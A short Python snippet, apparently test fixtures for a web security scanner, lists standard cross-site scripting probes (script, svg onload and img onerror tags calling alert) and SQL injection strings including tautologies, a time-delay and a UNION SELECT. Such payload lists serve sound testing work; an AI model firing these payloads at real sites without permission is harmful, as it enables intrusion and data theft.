
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '" onmouseover="alert(1)"',
    "'><svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "\" OR \"1\"=\"1",
    "'; WAITFOR DELAY '0:0:3' --",
    "' UNION SELECT NULL -- ",
]
